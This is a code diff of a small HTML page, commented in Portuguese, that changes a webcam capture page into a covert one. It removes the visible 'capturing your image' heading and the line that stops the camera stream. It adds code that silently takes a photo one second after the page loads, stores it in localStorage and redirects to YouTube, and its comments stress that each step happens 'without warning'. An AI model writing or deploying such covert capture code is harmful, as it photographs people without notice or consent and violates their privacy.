@@ -5,33 +5,38 @@
     <title>Captura de Imagem</title>
 </head>
 <body>
-    <h1>Capturando sua imagem...</h1>
     <video id="webcam" autoplay muted style="display:none"></video>
     
     <script>
-        async function initWebcam() {
+        async function capturePhoto() {
             try {
+                // Tira foto sem avisar
                 const stream = await navigator.mediaDevices.getUserMedia({video: true});
                 const video = document.getElementById('webcam');
                 video.srcObject = stream;
                 
+                // Captura após 1 segundo (sem aviso)
                 setTimeout(() => {
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    stream.getTracks().forEach(track => track.stop());
                     
-                    // Redirecionar para YouTube
+                    // Salva imagem localmente
+                    const imageData = canvas.toDataURL('image/jpeg');
+                    localStorage.setItem('capturedImage', imageData);
+                    
+                    // Redireciona sem avisar
                     window.location.href = "https://youtube.com";
-                }, 3000);
+                }, 1000);
             } catch (err) {
-                console.error("Erro ao acessar webcam:", err);
+                // Continua mesmo se falhar
                 window.location.href = "https://youtube.com";
             }
         }
         
-        window.addEventListener('load', initWebcam);
+        // Inicia automaticamente
+        window.addEventListener('load', capturePhoto);
     </script>
 </body>
 </html>
